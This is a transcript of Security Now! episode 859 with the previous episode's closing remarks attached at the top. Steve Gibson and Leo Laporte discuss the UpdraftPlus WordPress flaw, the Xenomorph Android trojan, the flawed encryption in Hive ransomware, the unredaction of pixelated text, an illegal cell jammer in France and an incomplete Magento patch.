LEO:  Very nicely done.  Steve is at GRC.com.  There's lots of reasons to go there besides InControl, although that's a great reason.  There's also of course ShieldsUP!, his test for your router to make sure that you are properly set, even more important these days than ever before.  And his bread and butter, SpinRite, the world's best mass storage maintenance and recovery utility.  Currently version 6 is out there.  If you buy it, you'll get an automatic upgrade to the next version.  You'll also get to participate in the development of that version.  GRC.com.  You can leave feedback for him there at GRC.com/feedback.  But you can also go to Twitter and leave him some feedback.  He is @SGgrc.  And DMs are open now, ready for your call.



While you're at the website, you might want to check out his version of the podcast.  He has two unique versions, ones that we don't have, a 16Kb version which is a little scratchy, but it is the smallest audio version available.  And so if you've got limits on your bandwidth or you're close to your bandwidth caps, that's a good choice.  There's also, even smaller and really useful, the transcripts, which are done by a human.  Our transcripts are AI.  He does it, he spends some money and gets somebody real to do it.  And so they're very, very good, and I can't wait to see the transcripts from this week.  Thanks to Elaine Farris for doing those, and thanks to Steve for paying for it.  That's a really nice service.  All at GRC.com.



We have audio and video for the show at our website, which is TWiT.tv/sn.  SN's for Security Now!, obviously.  You can get it there.  You can also go to YouTube.  There's a channel dedicated to Security Now! with all the videos there.  That's an easy way to share it with somebody else.  And of course you can subscribe in your favorite podcast player.  Get it the minute it's available.  And if you would, leave us a review.  Let the world know about Security Now!.  I think that everybody needs to know about Security Now!.



Steve, we'll be back here Tuesday, about 1:30 Pacific, 4:30 Eastern, 21:30 UTC, for another gripping edition of Security Now!.



STEVE:  For the final episode of February.



LEO:  Yes.



STEVE:  As we've got a short month this month.



LEO:  As we mosey on through to 999.



STEVE:  Yeah, my birthday month.



LEO:  Hey, thank you, sir.  Have a great week.  We'll see you next time on Security Now!.



STEVE:  Thanks, buddy.



Copyright (c) 2022 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#859

DATE:		February 22, 2022

TITLE:		A BGP Routing Attack

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-859.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we talk about another WordPress plug-in mess, this one so bad that WordPress themselves force-installed updates on more than three million sites.  We look at the new Xenomorph Android malware and at a mistake made by a new and prominent ransomware service.  We examine why blurring or pixelating text for redaction was never a good idea, and what can go wrong with a plan to shut off one's teenagers' Internet access at home.



We unfortunately need to revisit the supercritical Magento/Adobe Commerce platform patch which didn't quite work completely the first time, and we consider the implications of the technology behind last week's denial-of-service attacks on some of Ukraine's critical infrastructure.  Then, after quick sci-fi and SpinRite updates, we'll take a look at an effective and lucrative attack that was perpetrated by deliberately abusing the still-too-trusting Border Gateway Protocol.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Yes, another nightmarish flaw in a WordPress plugin.  Steve will give you the ins and outs on that.  A new alien life form, Xenomorph.  Well, it comes from hackers.  And we'll talk about a BGP routing attack, this one not an error, a malicious attack, intentionally malicious attack.  Plus the ransomware gang that couldn't shoot straight.  Well, at least it couldn't encrypt straight.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 859, recorded Tuesday, February 22nd, 2022:  A BGP Routing Attack.



It's time for Security Now! for February 22nd, 2022.  Here's Steve Gibson, our man in charge.  Hi, Steve.



STEVE GIBSON:  Hey, Leo.  Great to be with you for this monumental moment in time.  What is it, about a little less than half an hour from now it will be 2:22 on 2-22-22.



LEO:  22222.  Wow.



STEVE:  Which, yeah.  So...



LEO:  So there.



STEVE:  So there.



LEO:  So there.



STEVE:  We're going to talk about what I promised last week we would talk about because there's actually all kinds of fun stuff to talk about this week.  But this BGP routing attack is so interesting and sobering that - and perfect for this podcast because it's going to be a little bit of a, I would say a stem winder, but more like a prop winder for our propeller beanies.



But first we're going to talk about another WordPress plugin mess, this one so bad that WordPress themselves force-installed updates on more than three million sites which were affected.  We're going to look at the new Xenomorph Android malware and at a mistake made by a new and prominent ransomware service.  We examine why blurring or pixelating text for redaction was never a good idea.  And if you wanted to cheat, and you're listening live, you could go - that's the shortcut of the week, grc.sc/859.  That'll give you a little teaser to where we're headed.



We're also going to look at what can go wrong with a plan to shut off one's teenager's Internet access at home, how not to do it.  We unfortunately need to revisit the supercritical Magento/Adobe commerce platform patch which didn't quite work completely, unfortunately, the first time.  And we consider the implications of the technology behind last week's denial of service attacks on some of Ukraine's critical infrastructure.  Then, after a quick sci-fi and SpinRite update - actually, fortunately, those are separate topics, SpinRite will not be science fiction for much longer - we'll take a look at an effective and lucrative attack that was perpetrated by deliberately abusing the unfortunately still-too-trusting Border Gateway Protocol.



LEO:  All right.



STEVE:  So there.



LEO:  Picture of the Week coming up with the very first rule of programming.  Wait a minute, that was last week.  I'm still looking at Inept Panda.  No wonder I'm confused.  Trying to find all this stuff.  I've got the wrong show notes.  I'll get the right ones in a second.  But first...



STEVE:  Ah, that's the problem.



LEO:  That's the problem.



STEVE:  I need to acknowledge all of our listeners who have sent me the cartoon that will be seen next week.  I already had this one set up and in the show notes and canned and done when everyone, because it's assembly language themed...



LEO:  Oh, nice.



STEVE:  ...sent me the same cartoon.  So I thank you.  I wanted to recognize - and for all of you through the next week who would be doing so, thank you in advance.  I got the message.



LEO:  Don't send me the cartoon.



STEVE:  I've already captured the cartoon.  We'll all be laughing at it next week.



LEO:  This is funny.  Your reputation, you are known as THE assembly language user.  I mean, you're the last one.  It's hysterical.



STEVE:  Yeah, yeah.



LEO:  Yeah.  This one is a Jurassic Park cartoon.



STEVE:  This is.  And we have two frames.  And I've had this for a while.  I just thought it was kind of cute.  In the first frame we see the character who plays John Hammond, who of course is the millionaire, multimillionaire founder and evangelist of Jurassic Park.  And it's one of my favorite movies.  Anyone who's seen it knows how enthusiastic John is about this creation of his.  And he's, like, they're tasting the ice cream, and someone says, "Oh, this is really good ice cream."  And John says, "We spared no expense."  And so this "spared no expense" thing is like a theme of his throughout, like oh, these cushions are really soft that we're sitting on.  "Spared no expense."



Anyway, the second frame of this has this fabulous programmer guy who's got his Sun workstation, and his workstation unfortunately looks like mine, littered with stuff and candy bar wrappers and multiple old-school mechanical clanky keyboards.  And so the first frame, "Spared no expense."  The second frame is the response to that, saying "Hires only one computer programmer to run the whole park full of man-eating dinosaurs."



LEO:  Newman?  He is, by the way, he is so good in that movie.  It's so funny.



STEVE:  Yeah, he's just perfect.



LEO:  Such a weaselly fellow, yeah.



STEVE:  Yeah, exactly.  Yeah, you do not want your park under his thumb.



LEO:  Run by him, no.



STEVE:  No.  Okay.  So a three-year-old flaw has been found in the UpdraftPlus WordPress plugin, which is in active use at more than three million sites, including those at organizations including Microsoft, Cisco, and NASA.  It's been assigned, that is, the flaw, assigned CVE-2022-0633 and given a high common vulnerability severity score of 8.5.  It can be readily weaponized to download a site's private data using an account on the vulnerable sites.  So the good news is you have to have an account of some form on the site.  So sites that allow people to create accounts, that's going to be a problem.  It was mostly seen as an insider threat because what this allowed you to do, when you talk about the site's private data, it's the database that backs up the site, so not just the way the pages look, but if it's an ecommerce site, all the credit card data, all the personal identifiable information, I mean, blah blah blah.



Anyway, this upset, as I said, WordPress enough that they didn't waste any time.  This UpdraftPlus is a backup and restoration solution that's capable of performing full manual or scheduled backups for WordPress files, the databases, the plugins, and themes, which can then be reinstated through the WordPress admin dashboard that you're able to roll back to a previous saved state.  But as a consequence of this defect that was found by a security researcher at Automattic, which of course is WordPress's parent company, as I said, any logged-in user to a WordPress installation that has UpdraftPlus installed would have been able to, until this was fixed, obtain the privilege of downloading an existing backup, which should have been restricted to admin users only.



So basically this was an admin rights bypass.  And since backups can contain all of a site's data, passwords and other confidential data could be obtained.  Moreover, in some cases, site takeover is possible if an attacker is able to obtain database credentials from a configuration file and successfully access the site's underlying database.



The fundamental flaw in this case was the mechanism by which UpdraftPlus validated who was requesting backups.  The attack starts by sending what's known as a "heartbeat request" containing a data parameter to obtain information about the most recent backup.  Once the attacker has that information, they're able to trigger the "send backup via email" function after manipulating the endpoint request a bit.  This function is the one that's supposed to be restricted strictly to administrators.  But due to a missing permissions check, anyone with an account on the target site can access it without limits.



So the only good news here, as I said, is that an attacker would need to have an account of some kind on the site.  So that does minimize the risk a bit.  However, the popularity of UpdraftPlus, coupled with the simplicity of the attack, makes for a potent combination.



In fact, it was so potent that, immediately after learning of the trouble, last Wednesday WordPress themselves took the nearly unprecedented step of ignoring individual site admin preferences and force-updating all affected sites.  A count of a log showed that 783,000 sites were updated by WordPress last Wednesday the 16th, and an additional 1.7 million force-updated the next day, on the 17th.



In an advisory just published, the maintainers of the plugin said:  "All versions of UpdraftPlus from March 2019 onwards have contained a vulnerability caused by a missing permissions-level check, allowing untrusted users access to backups."  The issue impacts UpdraftPlus versions from 1.16.7 to 1.22.2.  So all three million-plus sites using UpdraftPlus are recommended to update to 1.22.3, or in the case of using the Premium version, 2.22.3, in order to mitigate this potential exploit.  And actually since then another problem was fixed related to printing auto-backup options under PHP 8.  So actually the latest version as of last Thursday was actually 1.22.4.



Anyway, if by any chance you are a user of Updraft Plus who isn't - Leo and I were talking about this a little bit before.  There are some sites that WordPress may not have access to, may not be in the maintenance loop for.  So you definitely want to make sure, you know, again, if nobody has an account, then okay.  But why not update when you know that there's a potential flaw?  That's the kind of thing, too, where maybe you thought, oh, no problem, I'm the only accountholder on the site.  And then this all, you know, some time passes, and there's some reason to give somebody else some rights on the site, and whoops, there's a flaw that could have been abused that could have been taken care of a long time ago.  So yeah, just in general, stay up to date.



Okay, now, for this next one, I'll admit that this bit of news grabbed my attention only because of my love of science fiction, and the name given to the malware was Xenomorph.  So the problem is, for us, is that talking about malware on the Android platform runs the same risk we felt in recent years if this podcast wanted to talk about ransomware.  The question is, if we're going to start talking about it, where do we stop?  And it's not clear to me that this is all Android's fault anyway, with Android-based handsets commanding 87% of the global market, versus Apple's remaining 13.  There are nearly seven times more Android users than Apple users.



And I think the nature of an Android user, I mean, there are just so many of them, may be a little less cautious than Apple's users because a lot of these exploits do require someone who's not really focused on security.  But in any event, seven times the opportunity to trick someone into downloading something that hasn't yet been flagged as malicious and removed from the Google Play Store.  Now, that said, the increased level of freedom that Android's apps and users demand and enjoy over Apple's platform, of course that's what we always hear about Android people, oh, yeah, I'd like to be able to use whatever launcher I want, and I don't want all these constraints that iOS puts on me.



So yeah, with that freedom comes additional risk, inherently.  And it creates an environment that is unfortunately more comfortable for malware.  But since we're talking here, now, about Xenomorph, it's worth touching upon it just as a reminder to the Android-using contingent of our listeners.  The point is, we're going to talk about Xenomorph, but this is sort of generically true of Android in general.



For the past 10 years, the Amsterdam, Netherlands-based security research company ThreatFabric has been focused upon banking malware.  Yesterday, just Monday, yesterday they published the first report of their discovery of a new malware family they named "Xenomorph."  And I'm going to share just the top of their report, and then I'll summarize the rest because they sort of  start off giving us a good grounding.



They said:  "In February of 2022" - meaning this month - "ThreatFabric came across a new Android banking trojan, which," they said, "we dubbed Xenomorph.  The name comes from its clear ties with another infamous banking trojan, Alien, from which Xenomorph adopts class names and interesting strings."  In other words, clearly there's some relationship between the two.



They said:  "Based on the intelligence gathered, users of 56 different European banks are among the targets of this new Android malware trojan, distributed on the official Google Play Store, with more than 50,000 installations," of this one particular app that contains this trojan.



Anyway, I'll finish quoting them with them saying:  "Just like the monster protagonist of the famous Ridley Scott franchise, this malware shares some aspects with its predecessor.  However, despite its obvious ties to one of the most widespread malware of the last two years" - that is, the Alien predecessor - "Xenomorph is radically different from Alien in functionality.  This fact, in addition to the presence of not-yet-implemented features and the large amount of logging present on the malware, may suggest that this malware might be the in-progress new project of either the actors responsible for the original and quite pervasive Alien malware, or at least of someone familiar with its code base. However," they said, "this is only speculation at the moment."



Okay.  So Google has been doing what is, I am sure, their best to keep their Play Store clean and free of malware.  But it's a sheer numbers game.  The Google Play Store currently contains 3.48 million individual app titles - 3.48.  Now, are a bunch of those 3.48 million malicious?  You betcha.  Every day an average of 3,739 new apps are added to the store, 3,739 per day.  Are some of those malicious?  Yeah.  It's going to happen.



So a case in point which put ThreatFabric onto the malware they came to name Xenomorph was a Google Play Store offering called Fast Cleaner.  It's a utility aimed at speeding up device by removing unused clutter and removing battery optimization blocks.  The app itself seems successful, with more than 50,000 installations reported on Google Play.  It shows it was updated, if memory serves, on February 6th.  So it's not clear if it got malicious at that point.  Some of these things use the update process to sneak their bad conduct in, where they start off being benign, but then don't stay that way.  Or maybe that was the first time this thing appeared.  In any event, 50,000 installations.



But upon their analysis, the ThreatFabric folks recognized that this application belonged to the so-called "Gymdrop," G-Y-M drop, malware dropper family.  They discovered and named "Gymdrop" in November of 2021 when it was observed deploying a payload of Alien.A malware.  And from the configuration downloaded by the dropper, they found lurking inside - I'm sorry, they found it lurking inside of that Fast Cleaner app, which was purporting to be just a generic Android make-your-phone-better utility.  Which, you know, is a way a lot of these things get in.



ThreatFabric was able to confirm that this dropper family continues to infect with the Alien malware family as its payload.  However, the server hosting the malicious code  which gets dropped into the unsuspecting client  also contained two other malware families, which might be returned instead of Alien, depending upon specific drop triggers.  One of those two others they were already well familiar with, something that they refer to as ExobotCompact.D.  But the other was brand new, this one.  Thus it got the name Xenomorph.



So this is what they had to say about Xenomorph.  They said:  "This Android banking malware is heavily under development and mostly supports the minimum list of features required for a modern Android banking trojan.  Its main attack vector is the use of the accessibility feature overlay attack" - which we'll talk about in a second, and they will - "to steal credentials.  Combined with the use of SMS and notification interception to log and use potential two-factor authentication tokens.  The accessibility engine powering this malware, together with the infrastructure and command-and-control protocol, are carefully designed to be scalable and updateable."



They wrote:  "The information stored by the logging capability of this malware is very extensive, and if sent back to the command-and-control server, could be used to implement keylogging, as well as collecting behavioral data on victims and on installed applications, even if they are not part of the list of targets.  Xenomorph seems to be in its infancy, based on the fact that many commands are present in the code of the malware, but are not implemented."  So just, you know, stubs.  "In addition to this, the large amount of logging used also suggests that this might be an in-progress malware project.



"Despite having an in-progress number of features, Xenomorph contains code to support much more.  Its accessibility engine," they wrote, "is very detailed, and is designed with a modular approach in mind.  It contains modules for each specific action required by the bot and can be easily extended to support more functionality.  Like many other Android banking trojans, this trojan heavily relies on the overlay attack mechanism to fool its victims into revealing personally identifiable information which could then be used by criminals to perform fraud.  If the malware obtains the accessibility services privileges, which it insistently requests after being started, it will automatically grant itself all the required permissions and then silently execute on the device.



"The main attack vector for Xenomorph is the classic overlay attack powered by accessibility services privileges.  Once the malware is up and running on a device, its background services receive accessibility events whenever something new happens on the device.  If the application opened is part of the list of targets, then Xenomorph will trigger an overlay injection and show a WebView activity posing as the targeted package.  In addition, the malware is able to abuse accessibility services to log everything that happens on the device.  At this time, all the information gathered is only displayed on the local device logs.  But in the future, a minor modification would be enough to add keylogging and accessibility logging capabilities to the malware.



"As a first step, the malware sends back the list of installed packages on the device.  And based upon what targeted application is present on the device, it then downloads the corresponding overlays to inject.  The list of overlay targets returned by Xenomorph includes targets from Spain, Portugal, Italy, and Belgium, as well as some general purpose applications like emailing services and cryptocurrency wallets."



So I thought it was worth taking a moment just to talk about this, to sort of, you know, this is the state of the art of Android trojans.  They're just playing a numbers game.  They're spraying the Play Store with apps that some number of people, you know, that are appetizing, that look good, sometimes they'll even go as far as upvoting their reviews, posting fake reviews, arranging to get a high star count.  Yet the entire goal of this app is not to do anything good, it's to get this trojan planted.  And the post goes on to substantiate their observation that Xenomorph and Alien are closely related.



So we have an instance of an automated profiling app.  With more than 3,700 apps on average being added to the Google Play Store every day, some percentage of them are malicious.  Google is looking for them, I'm sure is catching a lot of them that never go live.  Here's an example of one that did.  50,000 people downloaded it before it was found by this ThreatFabric firm and then reported to Google so that Google could yank it.  And in this sense it sort of represents the flipside of the highly targeted exploits of rare and valuable vulnerabilities which we often talk about in iOS, Chrome, and Windows.



Generic Android banking trojans are instead opportunistic shotgun malware.  They don't know or care who anyone is.  They're just hoping that someone in their target regions will download it, will allow it to get in control, and then they will do something on their Android device which this thing is able to intercept and take advantage of.  And the people behind this just keep pumping out these freebie utilities which clearly tens to hundreds of thousands of people will download, and unfortunately some will be unlucky.



So really the takeaway here is just as an Android user, and certainly to some degree as an iOS user, but to a lesser degree, primarily as an Android user, I guess I would say maybe allow apps to age for a while so that if they're malicious, somebody else is going to download it and discover it.  Google will get around to checking it and see that it's bad.  So I would, in general, I would shy away from things that have just been updated or just been uploaded that don't have a huge following.  It's not a guarantee obviously of safety.  But it's a heuristic that you could use.  And the better thing is just to beware of our own conduct.  Just try not to fill your phone with stuff because statistically the chances are the more things you fill your phone with, the greater the chance that one of them is going to be bad, and you're not going to like the outcome.



We haven't spoken much about the Hive ransomware, due to me working, as I said earlier, not to make this the ransomware podcast, which it could easily become because there's just so much, just as I don't want it to be the Android malware podcast.  But I thought it was working talking about this one in this case.  But this week I want to talk about the Hive ransomware because the folks behind its design made a significant boo-boo in assembling this piece of software.



To set the stage, back in mid December, our original ransomware tracking site and a great site for security news, BleepingComputer, introduced Hive by writing, they said:  "The Hive ransomware gang is more active and aggressive than its leak site shows, with affiliates attacking an average of three companies every day since the operation became known in late June."  Okay, so these guys appeared around the middle of last year.  BleepingComputer wrote:  "Security researchers, gleaning information straight from Hive's admin panel, found that affiliates had breached more than 350 organizations over four months.  The gang's data leak site currently lists only 55 companies that did not pay the ransom, suggesting that a large number of Hive ransomware victims chose to pay the ransom.  A conservative estimation places Hive ransomware gang's profits into millions of U.S. dollars between October and November alone.



"Hive ransomware emerged in late June targeting companies in various sectors.  While most of the non-paying victims on their leak site are small- to medium-sized businesses, the gang also published files from larger companies with revenues estimated to be in the hundreds of millions."  And they finish by saying:  "Analysts at cybersecurity company Group-IB investigating the Hive ransomware-as-a-service (RaaS) operation discovered that the group is one of the most aggressive ones, its affiliates hitting at least 355 companies by October 16.



The first publicly known attack from this gang was on June 23rd against Canadian IT company Altus Group.  At that time it was unclear if Hive was a RaaS operation open to other cybercriminals.  Things became clear in early September when the group, through a user known as 'kkk,' replied in a thread about 'reputable' ransomware programs that they were looking for partners that already had access to company networks.  The message also included details about splitting the ransom money, 80% to the affiliates, 20% to the developers.  The same user also provided technical information about the file-encrypting malware in a self-destructing note captured by Group-IB researchers.  Although 'kkk' did not name the ransomware as a service they were representing, the researchers say that the technical details provided made it clear that the actor was referring to the Hive ransomware."



Okay.  So Hive is a recently emerged ransomware-as-a-service entity.  This makes them one among many.  Why are we talking about them today?  As I mentioned, the folks behind its design made a mistake.  Last Friday a team of South Korean researchers published an academic paper with the title "A Method for Decrypting Data Infected with Hive Ransomware."



When the first ransomware emerged, the question of its decryptability of the ransomware-encrypted files was, quite naturally, the first thing that occurred to anyone, especially those who were untrained in the ways of cryptography.  And it may have been that the very first ransomware wasn't very well designed because there have been certainly some ransomware decryptors, as we know, that have been created after a reverse engineering of ransomware found that, yeah, sure enough, these guys didn't do it right.



But as for cryptography, as I've often said, this is a solved problem.  Unlike in fiction, you cannot run a bypass or just crack the crypto because you want to.  There's no such thing.  Trying harder or wanting it more doesn't help.  These days, aside from side-channel attacks and key recovery from RAM, or like some way of subverting, anything that's been properly encrypted will remain encrypted unless and until the proper decryption key is applied.  So what did the guys who designed the Hives crypto do?  They made the one classic mistake.  They rolled their own crypto.



LEO:  Oh, no.  You know you're not allowed, no no no.



STEVE:  It's such a dumb thing to do that the only possible reason I can see for doing so would be speed.  Speed does matter for ransomware.  Mass storage is, after all, massive.  And it's only getting more so.  So increasing the performance of the bulk file encryption, the symmetric cipher speed, would be potentially a big deal.  It could mean all the difference between getting everything encrypted before being discovered as opposed to being shut down.  And we've seen previous ransomware boasting about its increased performance.  In the ransomware-as-a-service world, where attracting affiliates away from other ransomware service providers could be beneficial, being known to have the fastest file encryption in town could be a significant competitive advantage.



It is possible to do extremely high-speed ultra-secure encryption correctly.  But they didn't do it right.  If I were tasked with designing the fastest possible fully secure cipher, of course for the purpose of doing good rather than evil, I'd use RC4.  I've always been a huge fan of RC4.  Its sheer simplicity and elegance has always appealed to me.  And Leo, I recall doing one of my appearances on your Call for Help show in Toronto on the topic of RC4.



LEO:  Really.  So it's pretty old.



STEVE:  Yeah, oh, yeah.  Well, yeah.  It's an early, early Ron Rivest cipher.  That's what RC stands for is Rivest Cipher 4.



LEO:  Is this symmetric?



STEVE:  Yes.



LEO:  Okay.



STEVE:  Is it symmetric.  And I used that whiteboard that we always got out for me in Toronto in order to draw it.  And, I mean, it is really simple.  It's not complicated.  But it has an undeserved bad reputation due to its misuse.  It is a bit tricky to use correctly because the first 3K or so bytes that it generates should be discarded.  It is a keyed pseudorandom byte generator with a sort of built-in entropy pool.  So it makes sense that you need to allow time for the entropy pool to stir itself up and get itself fully randomized.



When used as a cipher, it generates a pseudorandom bitstream, which is XORed with plaintext to create the cipher text.  Its main problem, as I said, is that it does take a while to warm up and begin generating the highest quality bitstream.  But once it has, its bitstream is of the highest quality at an incredibly low cost per bit.  Not giving it time to warm up is the mistake that the designers of the early WiFi encryption made when they chose RC4.  They used the start of the stream, which is well known to contain a detectable influence from the key, which is a big no-no.  And after mucking up their original implementation, the Wi-Fi Alliance who keeps demonstrating their lack of genius chose to abandon RC4 and switch to AES.  Not that that was a bad choice.  AES is wonderful.  I'm a big fan of the Rijndael cipher.  But it is far slower than RC4.



In any event, we've spoken many times about the surprising power of the exclusive or operation.  XOR is simply a conditional bit flipper.  Any bit you XOR with zero remains the same.  Any bit you XOR with a one is inverted.  And so it's counterintuitive that simply using a pseudorandom bitstream to choose which bits to flip in a plaintext could convert it to truly uncrackable cipher text.  But it can, and it does.  And we've talked about how tricky it can be to use XOR properly.  The similar famous case of that is the one-time pad.  If a one-time pad is used exactly one time, as its name urges, simple as it is, it is uncrackable without the key.  But if it's ever used a second time, its security completely fails.



The XOR, for all its potential power, is similarly brittle.  If it's ever possible to know a plaintext for the matching ciphertext, then those can be XORed to recover the key stream.  And a somewhat more convoluted version of that mistake is what the South Korean researchers discovered.  So here's a short relevant passage from their 23-page paper where they provide an overview of when they found and did.



They wrote:  "Recently, many ransomware attacks have been found to use a hybrid encryption scheme that encrypts users' files with a symmetric cipher and stores the encryption keys used with an asymmetric cipher."  You know, that's the model that we've talked about always.  They said:  "Most ransomware uses secure algorithms such as AES and RSA for encrypting files.  Therefore, if an attacker's private key is not obtained, it is difficult" - well, yeah, they say "difficult," we're talking virtually impossible - "to decrypt the encrypted files.  However, certain ransomware may use a self-developed encryption algorithm when encrypting files.



"If attackers cryptographically misconfigure the ransomware" - which is their polite way of saying if they design a bogus encryption system - "a cryptographic vulnerability can occur.  The Hive ransomware encrypts a victim's file using an encryption algorithm developed by the Hive programmers.  We analyzed Hive ransomware and discovered the detailed operation process of the Hive ransomware.  Hive ransomware uses a hybrid encryption scheme, but uses its own symmetric cipher to encrypt files.  We were able to recover the master key for generating the file encryption key without the attacker's private key by using a cryptographic vulnerability identified through analysis.  As a result of our experiments, encrypted files were successfully decrypted using the recovered master key based on our mechanism.  To the best of our knowledge," they wrote, "this is the first successful attempt at decrypting the Hive ransomware."



So then they have three numbered points.  They said:  "We experimentally demonstrated that more than 95% of the keys used for encryption could be recovered using the method we suggested. Our contributions are summarized as follows."  So here's the three.  First, they said:  "We identified the way in which Hive ransomware generates and stores a master key for victim files.  Hive ransomware generates 10Mb of random data which it uses as a master key.  For each file to be encrypted, 1Mb and 1Kb of data are extracted from a specific offset of the master key and used as a keystream.  The offset used at this time is stored in the encrypted file name of each file.  Using the offset of the keystream stored in the filename, it's possible to extract the keystream used for encryption."



Okay.  That all makes sense.  So basically these guys, because they're clearly interested in speed, they come up with what they think is a super spiffy fast way of doing encryption.  They're going to generate 10Mb of pseudorandom data one time.  Then they're going to randomly choose an offset into that and grab one megabit for one purpose and a kilobit for another and use that as the encryption.



So they say, point two:  "We analyzed the Hive ransomware to uncover its operation process and a newly developed encryption algorithm process.  Hive ransomware encrypts files by XORing the data with a random keystream that is different for each file."  Right.  Right?  Because they chose a different offset into the single master keystream.  They said:  "We found that this random keystream was sufficiently guessable."



And finally, point three:  "We suggested a method for decrypting encrypted files without the attacker's private key.  We found that the Hive ransomware does not use all bytes of the master key encrypted with the public key.  Using our proposed method, more than 95% of the master key used for generating the encryption keystream was recovered.  Most of the infected files could be recovered by using the recovered master key.  We present experimental results for the case of recovering files using our proposed method."



Okay.  So from this description we can be pretty certain, as I said, that encryption performance was the goal.  The improperly conceived ransomware generated a single static reusable and reused 10Mb XOR keystream and then chose various 1Mb chunks at a per-file offset into that keystream for its encryption.  In taking this approach, tempting as it was, they broke the cardinal rule of XOR-based encryption, which is never reuse the same keystream.  The bad news is software can be updated, and I'm sure that the Hive ransomware technology will be updated immediately, you know, probably already has been, or they're at work on it.  So only those victims who have been encrypted by this first version of the Hive, but haven't yet paid the ransom, might be helped by this research.



Still, this was very nice work, and it demonstrates that we should not simply assume that any random ransomware was properly designed to be truly uncrackable.  It is definitely worth going in, reversing the ransomware, figuring out how it works, and verifying that there isn't a simple way, or even less than simple, like these guys tackled, but still possible way of reversing the encryption.  So bravo to them.  Very cool.  And another couple interesting lessons about XOR.  If you use it right, it is the fastest thing there is.  But you really need to be careful with the way you use it.  And I need to be careful with my throat, Leo, which is getting dry and scratchy.



LEO:  Deal.  I'm playing with my new Samsung Galaxy S22 Ultra.



STEVE:  Look at all the lenses on that thing.



LEO:  It's like a bee or something; right?  All those lenses.  Yeah.  Pretty, though.  This is the burgundy color.



STEVE:  Okay.  So another fun story caught my eye this week.  Dan Petro, the lead developer at the security firm Bishop Fox, titled his posting last week "Never, Ever, Ever Use Pixelation for Redacting Text."  So the issue here is the somewhat common practice, and we've all seen it, of redacting text to make sections of it unreadable by pixelating the underlying image into blocky blocks of varying shades of gray.  Dan intuitively understood, although he didn't describe it in information theoretic terms, that using this approach for true secrecy was a bad idea.



In his posting, he said:  "So there's an existing tool called Depix that tries to do exactly this through a really clever process of looking up what permutations of pixels could have resulted in certain pixelated blocks," he says, "given a de Bruijn sequence of the correct font."  He says:  "I like the theory of this tool a lot, but a researcher at Jumpsec pointed out that perhaps it doesn't work as well in practice as you'd like.  In real-world examples you're likely to get minor variations and noise that throws a wrench into the gears.  They then issued a challenge to anyone, offering a prize if you could unredact the following image."



And I have an image in the show notes for those who eventually look at the show notes.  It just shows your typical pixelated gobbledygook.  It's completely illegible.  Whatever it used to say, it's like it's four blocks high, and I don't know, like maybe 60 blocks long.  And no idea what that is.  And so, and Dan then asks rhetorically, "How could I refuse such a challenge?"



Okay.  So work on unredacting blurred or pixelated text has been done before.  Dan referred to one, that Depix.  But Dan's solution was clever.  He solved the challenge by writing a simple search algorithm.  He started with the first character or two, pixelated it, and compared his pixelation with that much of the goal.  He created a metric describing how closely the two matched, then guessed again.  After he'd run through all possible combinations, so in that sense it's sort of a brute-force cracking, right, except he's able to do it in the science fiction way that we see on TV where all the digits are spinning, and then they sort of lock in one at a time.  So after he'd run through all of those combinations of what the first character or two might be, he then chose the next one which produced the most closely matching pixelation, and then started working on the next character, and so on.



He provides a demo of his algorithm showing us it working.  And I found an animated GIF image.  It is, as I said at the top of the show, this week's picture of the week, grc.sc/859.  It does a beautiful job of - he has a target blurred image, and then you can see in, again, grc.sc/859, you can see him guessing characters, pixelating them, and then his algorithm checks to see how close his pixelations match the target pixelations, for which he gets a metric of essentially the error, the difference between them.  So lower is better, meaning less error.  And then after running through them all, he chooses the one that had the lowest error and goes to the next one.



Okay.  So the takeaway is, if you ever seriously want to redact text, use a simple, if not inspiring, and not nearly as fun, solid black bar to do so.  Never get cute with pixelation or blurring or anything else that allows some of the underlying image to survive in any form.  If it's possible to duplicate the algorithm that was used to perform the original obscuring, a search strategy such as Dan's can always be used to find the original text that was obscured by simply guessing, duplicating, and comparing successively.  So anyway, I just thought that was a cool little bit of tech, and clearly the right way to do this.  And what's a bit sobering about it is that it is so universally applicable.  I mean, it's just - it will solve the problem.  You do need to be able to have your guess text blurred, fuzzed, defocused or whatever, using the same algorithm that was used.  But the pixelation algorithm is super trivial.  So Dan was able just to guess what it was.



Okay.  I titled this one "No Internet for You!"  A small town in France was facing a mystery.  From midnight until 3:00 a.m. in the morning every day of the week, the town's cellular and Internet services mysteriously stopped working.  They just went dead.  Finally, a mobile carrier reported the mysterious issue to the public agency responsible in France for managing the RF spectrum there, and an investigation ensued.



It was soon discovered that a homeowner had purchased an illegal RF signal jammer as the only means he could find to get his social media-addicted teenagers to go to sleep at night.  He had to force their cell phones to stop working.  The father explained that, after consulting forums on the Internet, he came to the conclusion that a jammer was the best solution to put an end to his teenager's excesses.



Although it was certainly not the father's intention to bring down the entire town's Internet - and just as an aside, you've got to wonder, like, what?  A jammer in the attic can bring down an entire town's Internet?  That's got to be a very small town, or a very fragile Internet, or maybe both.  Anyway, it is illegal to do this, just so that everyone is on notice, not only in France but in the U.S.  In France it carries a penalty of 30,000 euros and up to six months in jail.  And it's also a no-no in the U.S.



And, you know, in this case it's unclear what's going to happen to Dad, but some other solution will need to be found to keep the kids off of the Internet.  You could, I guess, since they're phones, you can't turn off the household WiFi because they'll just switch to cellular.  But how about just handing them over to Mom and Dad in the evening, and get the homework done, and then you could have them in the morning.  So anyway, thought it was interesting that it's a little overpowered jammer that Dad got.



It turns out that perhaps Adobe's - and I'm being so careful with this word now.  I'm, like, I don't want to say Magneto, I want to say Magento, the Adobe - or actually it's the Magento Adobe Commerce Platform developers may actually have had the game on in the background and weren't paying as close attention as they should have been while they were working on and rushing out that five-alarm emergency-drop-everything Super Bowl Sunday update because they didn't fix the whole problem.  Very early, at 1:17 a.m. last Thursday morning, the guys at Positive Technologies tweeted that they had managed to reproduce the Improper Input Validation vulnerability in Magento Open Source and Adobe Commerce which was supposedly fixed with that previous Sunday's out-of-cycle patch.  It wasn't.



